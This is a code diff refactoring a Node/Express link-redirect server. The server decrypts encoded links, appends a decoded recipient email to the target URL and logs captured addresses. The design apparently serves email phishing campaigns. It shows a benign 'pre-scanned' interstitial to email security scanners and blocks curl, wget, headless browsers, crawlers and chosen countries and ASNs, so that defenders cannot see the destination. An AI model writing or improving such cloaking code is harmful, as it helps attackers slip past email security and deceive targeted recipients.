@@ -20,6 +20,17 @@ try {
   console.log(`[${new Date().toISOString()}] ⚠️ geoip-lite not installed; ALLOWED_COUNTRIES depends on edge headers only`);
 }
 
+// ================== CONSTANTS ==================
+const SANITIZATION_MAX_LENGTH = 2000;
+const UA_TRUNCATE_LENGTH = 160;
+const PATH_TRUNCATE_LENGTH = 200;
+const ACCEPT_TRUNCATE_LENGTH = 80;
+const REFERER_TRUNCATE_LENGTH = 160;
+const BRUTE_FORCE_MIN_RATIO = 0.4;
+const LOG_ENTRY_MAX_LENGTH = 300;
+const EMAIL_DISPLAY_MAX_LENGTH = 80;
+const URL_DISPLAY_MAX_LENGTH = 120;
+
 const app = express();
 app.use(cors());
 app.use(express.json({ limit: "64kb" }));
@@ -85,7 +96,7 @@ function sanitizeOneLine(s) {
     .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, " ") // control chars (except CR/LF)
     .replace(/[ \t]{2,}/g, " ")
     .trim()
-    .slice(0, 2000);
+    .slice(0, SANITIZATION_MAX_LENGTH);
 }
 
 // Backward-compat alias if other code calls sanitizeLogLine
@@ -416,7 +427,7 @@ const EXPECT_HOSTNAME   = process.env.TURNSTILE_EXPECT_HOSTNAME || ".netlify.app
 const MAX_TOKEN_AGE_SEC = parseInt(process.env.TURNSTILE_MAX_TOKEN_AGE_SEC || "90", 10);
 const ENFORCE_ACTION    = (process.env.TURNSTILE_ENFORCE_ACTION || "1") === "1";
 const HEADLESS_BLOCK    = (process.env.HEADLESS_BLOCK || "0") === "1";
-// (No. 6) Stronger hardcoded defaults so you’re protected even without envs:
+// (No. 6) Stronger hardcoded defaults so you're protected even without envs:
 const HEADLESS_STRIKE_WEIGHT = parseInt(process.env.HEADLESS_STRIKE_WEIGHT || "3", 10);
 const HEADLESS_SOFT_STRIKE   = (process.env.HEADLESS_SOFT_STRIKE || "0") === "1"; // if 1, two soft signals count as a strike
 
@@ -454,21 +465,24 @@ function getClientIp(req) {
   );
 }
 
-// Base64 helpers (URL-safe and standard) with padding fixes
-function b64urlToBuf(s) {
+// Consolidated Base64 helper with flavor support
+function b64ToBuf(s, flavor = 'url') {
   try {
-    s = (s || "").replace(/-/g, "+").replace(/_/g, "/");
-    while (s.length % 4) s += "=";
-    return Buffer.from(s, "base64");
+    let normalized = s || "";
+    if (flavor === 'url') {
+      normalized = normalized.replace(/-/g, "+").replace(/_/g, "/");
+    }
+    while (normalized.length % 4) normalized += "=";
+    return Buffer.from(normalized, "base64");
   } catch { return null; }
 }
 
+function b64urlToBuf(s) {
+  return b64ToBuf(s, 'url');
+}
+
 function b64stdToBuf(s) {
-  try {
-    s = (s || "");
-    while (s.length % 4) s += "=";
-    return Buffer.from(s, "base64");
-  } catch { return null; }
+  return b64ToBuf(s, 'std');
 }
 
 function tryBase64UrlToUtf8(s) {
@@ -498,7 +512,7 @@ function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
 <meta name="robots" content="noindex,nofollow">
 <body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
   <h1>Checking this link</h1>
-  <p>This link was pre-scanned by security software. If you’re the recipient, click continue.</p>
+  <p>This link was pre-scanned by security software. If you're the recipient, click continue.</p>
   <p><a href="/challenge?next=${encodeURIComponent(nextEnc)}" rel="noopener">Continue</a></p>
   <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
 </body>`);
@@ -533,14 +547,14 @@ function computeScannerStatsFromLogs() {
 
       // reason=... (stops at next space)
       let reason = "unknown";
-const rPos = line.indexOf(" reason=");
-if (rPos >= 0) {
-  let tail = line.slice(rPos + 8);           // after " reason="
-  const nPos = tail.indexOf(" nextLen=");
-  if (nPos >= 0) tail = tail.slice(0, nPos); // trim at nextLen=
-  reason = tail.trim().replace(/_/g, " ");
-}
-try { reason = decodeURIComponent(reason.replace(/\+/g, " ")); } catch {}
+      const rPos = line.indexOf(" reason=");
+      if (rPos >= 0) {
+        let tail = line.slice(rPos + 8);           // after " reason="
+        const nPos = tail.indexOf(" nextLen=");
+        if (nPos >= 0) tail = tail.slice(0, nPos); // trim at nextLen=
+        reason = tail.trim().replace(/_/g, " ");
+      }
+      try { reason = decodeURIComponent(reason.replace(/\+/g, " ")); } catch {}
 
       // ua="..."
       let uaKey = "(empty)";
@@ -558,14 +572,12 @@ try { reason = decodeURIComponent(reason.replace(/\+/g, " ")); } catch {}
   return { total, byReason, byUA };
 }
 
-
-
 function logScannerHit(req, reason, nextEnc) {
   const ip   = getClientIp(req);
-  const ua   = (req.get("user-agent") || "").slice(0, 160);
-  const path = (req.originalUrl || req.path || "").slice(0, 200);
-  const ref  = (req.get("referer") || req.get("referrer") || "").slice(0, 160);
-  const acc  = (req.get("accept") || "").slice(0, 80);
+  const ua   = (req.get("user-agent") || "").slice(0, UA_TRUNCATE_LENGTH);
+  const path = (req.originalUrl || req.path || "").slice(0, PATH_TRUNCATE_LENGTH);
+  const ref  = (req.get("referer") || req.get("referrer") || "").slice(0, REFERER_TRUNCATE_LENGTH);
+  const acc  = (req.get("accept") || "").slice(0, ACCEPT_TRUNCATE_LENGTH);
 
   // counters
   SCANNER_STATS.total++;
@@ -706,7 +718,7 @@ function tryDecryptAny(segment) {
 
 /* Brute-force fallback: try decrypting every prefix; accept first that yields http(s) URL. */
 function bruteSplitDecryptFull(s){
-  const minPrefix = Math.max(40, Math.floor(s.length*0.4)); // avoid absurdly small prefixes
+  const minPrefix = Math.max(40, Math.floor(s.length * BRUTE_FORCE_MIN_RATIO)); // avoid absurdly small prefixes
   for (let k = s.length; k >= minPrefix; k--) {
     const prefix = s.slice(0, k);
     const got = tryDecryptAny(prefix);
@@ -791,7 +803,6 @@ const limitSseUnauth   = makeIpLimiter({ capacity: parseInt(process.env.SSE_UNAU
 // Apply to routes (before route definitions)
 app.use("/challenge", limitChallenge);
 app.use("/ts-client-log", limitTsClientLog);
-// (duplicated below-the-route instance left intact by design)
 
 /* ================== Geo / ASN policy (with fallback) ====================== */
 function getCountry(req){
@@ -840,7 +851,7 @@ function addStrike(ip, weight=1){
 }
 app.get("/__hp.gif", (req, res) => {
   const ip = getClientIp(req);
-  addLog(`[HP] honeypot hit ip=${ip} ua="${(req.get("user-agent")||"").slice(0,80)}"`);
+  addLog(`[HP] honeypot hit ip=${ip} ua="${(req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH)}"`);
   addStrike(ip, STRIKE_WEIGHT_HP);
   res.set("Cache-Control","no-store");
   return res.status(204).end();
@@ -871,7 +882,7 @@ app.post("/ts-client-log",
   express.text({ type: "*/*", limit: "64kb" }),
   (req,res)=>{
     const raw = typeof req.body === "string" ? req.body : JSON.stringify(req.body);
-    addLog(`[TS-CLIENT] ${String(raw || "").slice(0,300)}`);
+    addLog(`[TS-CLIENT] ${String(raw || "").slice(0,LOG_ENTRY_MAX_LENGTH)}`);
     addSpacer();
     res.status(204).end();
   }
@@ -1079,32 +1090,33 @@ function splitCipherAndEmail(baseString, decodeFn, isEmailFn) {
   return { mainPart, emailPart, delimUsed };
 }
 
-/* ================== Core redirect logic (shared) ========================== */
-async function handleRedirectCore(req, res, baseString){
+// ================== REFACTORED HANDLE REDIRECT CORE ==================
+function checkSecurityPolicies(req) {
   const ip = getClientIp(req);
   const ua = req.get("user-agent") || "";
+  
+  if (isBanned(ip)) {
+    addLog(`[BAN] blocked ip=${ip}`);
+    addSpacer();
+    return { blocked: true, status: 403, message: "Forbidden" };
+  }
 
-  if (isBanned(ip)) { addLog(`[BAN] blocked ip=${ip}`); addSpacer(); return res.status(403).send("Forbidden"); }
-
-  // ---------- INSERTED: Email/security scanners -> Interstitial (early, before any blocks) ----------
+  // Email/security scanners -> Interstitial (early, before any blocks)
   const uaL = ua.toLowerCase();
   if (EMAIL_SCANNER_UAS.some(b => uaL.includes(b))) {
-    addLog(`[SCANNER] interstitial ip=${ip} ua="${ua.slice(0,80)}"`);
-    const nextEnc = encodeURIComponent(baseString);
-    logScannerHit(req, "Known scanner UA", nextEnc);                  // <- inserted logging call
-    return renderScannerSafePage(res, nextEnc, "Known scanner UA");
+    addLog(`[SCANNER] interstitial ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
+    return { blocked: true, interstitial: true };
   }
-  // ---------------------------------------------------------------------------------------------------
 
-  // (No. 5) Quick UA denylist to drop obvious non-browser clients early
+  // Quick UA denylist to drop obvious non-browser clients early
   const BAD_UA = /(okhttp|python-requests|curl|wget|phantomjs)/i;
   if (BAD_UA.test(ua)) {
-    addLog(`[UA-BLOCK] ip=${ip} ua="${ua.slice(0,80)}"`);
+    addLog(`[UA-BLOCK] ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
     addSpacer();
-    return res.status(403).send("Forbidden");
+    return { blocked: true, status: 403, message: "Forbidden" };
   }
 
-  // Headless/bot heuristic (safer: only strike on "hard" indicators)
+  // Headless/bot heuristic
   const hs = headlessSuspicion(req);
   if (hs.suspicious) {
     addLog(`[HEADLESS] ip=${ip} reasons=${hs.reasons.join(',')}`);
@@ -1113,125 +1125,202 @@ async function handleRedirectCore(req, res, baseString){
     } else if (HEADLESS_SOFT_STRIKE && hs.softCount >= 2) {
       addStrike(ip, 1);
     }
-    if (HEADLESS_BLOCK && hs.hardCount > 0) { addSpacer(); return res.status(403).send("Forbidden"); }
+    if (HEADLESS_BLOCK && hs.hardCount > 0) {
+      addSpacer();
+      return { blocked: true, status: 403, message: "Forbidden" };
+    }
   }
 
+  // Geo/ASN blocking
   const ctry = getCountry(req);
   const asn  = getASN(req);
-  if (countryBlocked(ctry)) { addLog(`[GEO] blocked country=${ctry} ip=${ip}`); addSpacer(); return res.status(403).send("Forbidden"); }
-  if (asnBlocked(asn))      { addLog(`[ASN] blocked asn=${asn} ip=${ip}`);     addSpacer(); return res.status(403).send("Forbidden"); }
+  if (countryBlocked(ctry)) {
+    addLog(`[GEO] blocked country=${ctry} ip=${ip}`);
+    addSpacer();
+    return { blocked: true, status: 403, message: "Forbidden" };
+  }
+  if (asnBlocked(asn)) {
+    addLog(`[ASN] blocked asn=${asn} ip=${ip}`);
+    addSpacer();
+    return { blocked: true, status: 403, message: "Forbidden" };
+  }
 
+  return { blocked: false };
+}
+
+async function verifyTurnstileAndRateLimit(req, baseString) {
+  const ip = getClientIp(req);
+  const ua = req.get("user-agent") || "";
+  
   const token = req.query.cft || req.get("cf-turnstile-response") || "";
   const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);
 
   const v = await verifyTurnstileToken(token, ip, { action:"link_redirect", linkHash, maxAgeSec:MAX_TOKEN_AGE_SEC });
   if (!v.ok) {
-  const next = encodeURIComponent(baseString);
-  const hostParam = (v.reason === "bad_hostname" && v.data && v.data.hostname)
-    ? `&host=${encodeURIComponent(v.data.hostname)}`
-    : "";
-  addLog(`[AUTH] token invalid (${v.reason}) ip=${ip} ua="${ua.slice(0,80)}" -> /challenge`);
-  return res.redirect(302, `/challenge?next=${next}${hostParam}`);
-}
+    const next = encodeURIComponent(baseString);
+    const hostParam = (v.reason === "bad_hostname" && v.data && v.data.hostname)
+      ? `&host=${encodeURIComponent(v.data.hostname)}`
+      : "";
+    addLog(`[AUTH] token invalid (${v.reason}) ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}" -> /challenge`);
+    return { redirect: `/challenge?next=${next}${hostParam}` };
+  }
 
   const { limited, retryAfterMs } = await isRateLimited(ip);
   if (limited) {
-    if (retryAfterMs && Number.isFinite(retryAfterMs)) res.setHeader("Retry-After", Math.ceil(retryAfterMs/1000));
-    addLog(`[RL] 429 ip=${ip}`); addSpacer(); return res.status(429).send("Too many requests");
+    if (retryAfterMs && Number.isFinite(retryAfterMs)) {
+      return { blocked: true, status: 429, retryAfter: Math.ceil(retryAfterMs/1000), message: "Too many requests" };
+    }
+    addLog(`[RL] 429 ip=${ip}`);
+    addSpacer();
+    return { blocked: true, status: 429, message: "Too many requests" };
   }
 
+  return { success: true };
+}
+
+function decryptAndParseUrl(req, baseString) {
+  const ip = getClientIp(req);
+  
+  // Robust path parsing using the helper
+  const { mainPart, emailPart: emailPart0, delimUsed } =
+    splitCipherAndEmail(baseString, decodeB64urlLoose, isLikelyEmail);
+
+  // Safe, defined logging (emailPart0 may be empty)
+  if (delimUsed) {
+    addLog(`[PARSE] delimiter used "${delimUsed}" mainLen=${mainPart.length} emailRawLen=${(emailPart0 || '').length}`);
+  }
+
+  // Try direct decrypt
+  let result = null;
+  try {
+    result = tryDecryptAny(mainPart);
+  } catch (e) {
+    addLog(`[DECRYPT] exception ip=${ip} seg="${String(mainPart).slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" err=${e.message}`);
+    addSpacer();
+    return { error: "Failed to load" };
+  }
+  
+  let finalUrl = result && result.url;
+  let emailPart = emailPart0 || null;
+
+  // Fallback: brute on entire combined base string
+  if (!finalUrl) {
+    const bf = bruteSplitDecryptFull(baseString);
+    if (bf && bf.url) {
+      finalUrl = bf.url;
+      // only fill emailPart if we didn't already get one from the splitter
+      if (!emailPart) emailPart = bf.emailRaw || null;
+      addLog(`[DECRYPT] fallback split used k=${bf.kTried} emailRawLen=${(bf.emailRaw || '').length}`);
+    }
+  }
+
+  if (!finalUrl) {
+    const why = explainDecryptFailure({
+      tried: result?.tried || [],
+      lastErr: result?.lastErr || null,
+      segLen: mainPart.length
+    });
+    addLog(`[DECRYPT] failed variants ip=${ip} seg="${String(mainPart).slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" mainLen=${mainPart.length} why=${why}`);
+    addSpacer();
+    return { error: "Failed to load" };
+  }
+
+  return { finalUrl, emailPart };
+}
+
+function processEmailAndFinalizeUrl(finalUrl, emailPart) {
+  // Decode & append optional trailing email (supports base64url + missing padding)
+  if (emailPart) {
+    // Strip one or more trailing guard chars you might add (/, ~)
+    const emailRaw = String(emailPart).replace(/[\/~]+$/,'');
+    const emailDecoded = (decodeB64urlLoose(emailRaw) || safeDecode(emailRaw)).trim();
+
+    if (emailDecoded && isLikelyEmail(emailDecoded)) {
+      finalUrl += '#' + emailDecoded;
+      addLog(`[EMAIL] captured ${maskEmail(emailDecoded)}`);
+    } else if (emailDecoded) {
+      addLog(`[EMAIL] ignored (not a valid email): "${emailDecoded.slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" (raw="${emailPart.slice(0,40)}…")`);
+    } else {
+      addLog(`[EMAIL] ignored (decode empty) raw="${emailPart.slice(0,40)}…"`);
+    }
+  }
+
+  return finalUrl;
+}
+
+function validateAndRedirect(finalUrl, req, res) {
+  const ip = getClientIp(req);
+  
+  try {
+    const hostname = new URL(finalUrl).hostname;
+    const okHost =
+      ALLOWLIST_DOMAINS.includes(hostname) ||
+      ALLOWLIST_SUFFIXES.some(s => hostname.endsWith(s));
+
+    if (!okHost) {
+      addLog(`[ALLOWLIST] blocked host=${hostname} ip=${ip}`);
+      addSpacer();
+      return res.status(403).send("Unauthorized URL");
+    }
+
+    addLog(`[REDIRECT] ip=${ip} -> ${finalUrl}`);
+    addSpacer();
+    return res.redirect(finalUrl);
+  } catch (e) {
+    addLog(`[URL] invalid ip=${ip} value="${(finalUrl || "").slice(0,URL_DISPLAY_MAX_LENGTH)}" err="${e.message}"`);
+    addSpacer();
+    return res.status(400).send("Invalid URL");
+  }
+}
+
+/* ================== Core redirect logic (refactored) ========================== */
+async function handleRedirectCore(req, res, baseString){
+  const securityCheck = checkSecurityPolicies(req);
+  if (securityCheck.blocked) {
+    if (securityCheck.interstitial) {
+      const nextEnc = encodeURIComponent(baseString);
+      logScannerHit(req, "Known scanner UA", nextEnc);
+      return renderScannerSafePage(res, nextEnc, "Known scanner UA");
+    }
+    return res.status(securityCheck.status).send(securityCheck.message);
+  }
+
+  const authCheck = await verifyTurnstileAndRateLimit(req, baseString);
+  if (authCheck.redirect) {
+    return res.redirect(302, authCheck.redirect);
+  }
+  if (authCheck.blocked) {
+    if (authCheck.retryAfter) {
+      res.setHeader("Retry-After", authCheck.retryAfter);
+    }
+    return res.status(authCheck.status).send(authCheck.message);
+  }
+
+  // Bot detection after successful auth
+  const ua = req.get("user-agent") || "";
   const knownBots = ["Googlebot","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebot","facebookexternalhit","ia_archiver","MJ12bot","AhrefsBot","SemrushBot","DotBot","PetalBot","GPTBot","python-requests","crawler","scrapy","curl","wget","phantomjs","HeadlessChrome"];
   const isBotUA = knownBots.some(b => ua.toLowerCase().includes(b.toLowerCase()));
-  if (isBotUA) { addLog(`[BOT] blocked ip=${ip} ua="${ua.slice(0,80)}"`); addSpacer(); return res.status(403).send("Not allowed"); }
+  if (isBotUA) {
+    addLog(`[BOT] blocked ip=${getClientIp(req)} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
+    addSpacer();
+    return res.status(403).send("Not allowed");
+  }
 
   const hasSecUA = !!req.get("sec-ch-ua");
   const hasFetchSite = !!req.get("sec-fetch-site");
-  if (!hasSecUA || !hasFetchSite) addLog(`[SUSPECT] ip=${ip} missing_sec_headers=${!hasSecUA||!hasFetchSite}`);
-
-  // --- robust path parsing using the helper above ---
-const { mainPart, emailPart: emailPart0, delimUsed } =
-  splitCipherAndEmail(baseString, decodeB64urlLoose, isLikelyEmail);
-
-// safe, defined logging (emailPart0 may be empty)
-if (delimUsed) {
-  addLog(`[PARSE] delimiter used "${delimUsed}" mainLen=${mainPart.length} emailRawLen=${(emailPart0 || '').length}`);
-}
-
-// Try direct decrypt
-let result = null;
-try {
-  result = tryDecryptAny(mainPart);
-} catch (e) {
-  addLog(`[DECRYPT] exception ip=${ip} seg="${String(mainPart).slice(0,80)}" err=${e.message}`);
-  addSpacer();
-  return res.status(400).send("Failed to load");
-}
-let finalUrl = result && result.url;
-
-// keep ONE mutable emailPart visible to later code
-let emailPart = emailPart0 || null;
-
-// Fallback: brute on entire combined base string
-if (!finalUrl) {
-  const bf = bruteSplitDecryptFull(baseString);
-  if (bf && bf.url) {
-    finalUrl = bf.url;
-    // only fill emailPart if we didn't already get one from the splitter
-    if (!emailPart) emailPart = bf.emailRaw || null;
-    addLog(`[DECRYPT] fallback split used k=${bf.kTried} emailRawLen=${(bf.emailRaw || '').length}`);
-  }
-}
-
-if (!finalUrl) {
-  const why = explainDecryptFailure({
-    tried: result?.tried || [],
-    lastErr: result?.lastErr || null,
-    segLen: mainPart.length
-  });
-  addLog(`[DECRYPT] failed variants ip=${ip} seg="${String(mainPart).slice(0,80)}" mainLen=${mainPart.length} why=${why}`);
-  addSpacer();
-  return res.status(400).send("Failed to load");
-}
-
-// --- Decode & append optional trailing email (supports base64url + missing padding)
-if (emailPart) {
-  // NEW: strip one or more trailing guard chars you might add (/, ~)
-  const emailRaw = String(emailPart).replace(/[\/~]+$/,'');   // <— add this line
-
-  const emailDecoded = (decodeB64urlLoose(emailRaw) || safeDecode(emailRaw)).trim();
-
-  if (emailDecoded && isLikelyEmail(emailDecoded)) {
-    finalUrl += '#' + emailDecoded;
-    addLog(`[EMAIL] captured ${maskEmail(emailDecoded)}`);
-  } else if (emailDecoded) {
-    addLog(`[EMAIL] ignored (not a valid email): "${emailDecoded.slice(0,80)}" (raw="${emailPart.slice(0,40)}…")`);
-  } else {
-    addLog(`[EMAIL] ignored (decode empty) raw="${emailPart.slice(0,40)}…"`);
-  }
-}
-
-// --- allowlist & redirect ---
-try {
-  const hostname = new URL(finalUrl).hostname;
-  const okHost =
-    ALLOWLIST_DOMAINS.includes(hostname) ||
-    ALLOWLIST_SUFFIXES.some(s => hostname.endsWith(s));
-
-  if (!okHost) {
-    addLog(`[ALLOWLIST] blocked host=${hostname} ip=${ip}`);
-    addSpacer();
-    return res.status(403).send("Unauthorized URL");
+  if (!hasSecUA || !hasFetchSite) {
+    addLog(`[SUSPECT] ip=${getClientIp(req)} missing_sec_headers=${!hasSecUA||!hasFetchSite}`);
   }
 
-  addLog(`[REDIRECT] ip=${ip} -> ${finalUrl}`);
-  addSpacer();
-  return res.redirect(finalUrl);
-} catch (e) {
-  addLog(`[URL] invalid ip=${ip} value="${(finalUrl || "").slice(0,120)}" err="${e.message}"`);
-  addSpacer();
-  return res.status(400).send("Invalid URL");
+  const decryptResult = decryptAndParseUrl(req, baseString);
+  if (decryptResult.error) {
+    return res.status(400).send(decryptResult.error);
+  }
+
+  const finalUrl = processEmailAndFinalizeUrl(decryptResult.finalUrl, decryptResult.emailPart);
+  return validateAndRedirect(finalUrl, req, res);
 }
-}
+
 /* ================== Challenge page (explicit render + CSP) ================ */
 app.get("/challenge", (req, res) => {
   const nextEnc = String(req.query.next || "");
@@ -1240,7 +1329,7 @@ app.get("/challenge", (req, res) => {
   const linkHash = hashFirstSeg(baseOnly);
   const cdata = `${linkHash}_${Math.floor(Date.now()/1000)}`;
 
-  addLog(`[CHALLENGE] next='${nextEnc.slice(0,120)}' cdata=${cdata.slice(0,16)}…`);
+  addLog(`[CHALLENGE] next='${nextEnc.slice(0,URL_DISPLAY_MAX_LENGTH)}' cdata=${cdata.slice(0,16)}…`);
   addLog(`[TS-PAGE] sitekey=${TURNSTILE_SITEKEY.slice(0,12)}… hash=${linkHash.slice(0,8)}…`);
 
   res.setHeader("Cache-Control", "no-store");
@@ -1392,7 +1481,7 @@ app.get(
   (req, res, next) => {
     // accept header Bearer token OR query/ephemeral token
     if (isAdmin(req) || isAdminSSE(req)) return next();
-    addLog(`[ADMIN] scanner-stats denied ip=${getClientIp(req)} ua="${(req.get("user-agent")||"").slice(0,80)}"`);
+    addLog(`[ADMIN] scanner-stats denied ip=${getClientIp(req)} ua="${(req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH)}"`);
     return res.status(401).type("text/plain").send("Unauthorized");
   },
   
@@ -1469,7 +1558,3 @@ app.listen(PORT, () => {
   addLog(startupSummary());   // <— write once into LOGS/stdout
   addSpacer();
 });
-
-// ---------- existing later limiter kept (harmless duplicate) ----------
-app.use("/stream-log", (req, res, next) => { if (isAdminSSE(req)) return next(); return limitSseUnauth(req, res, next); });
-// ----------------------------------------------------------------------
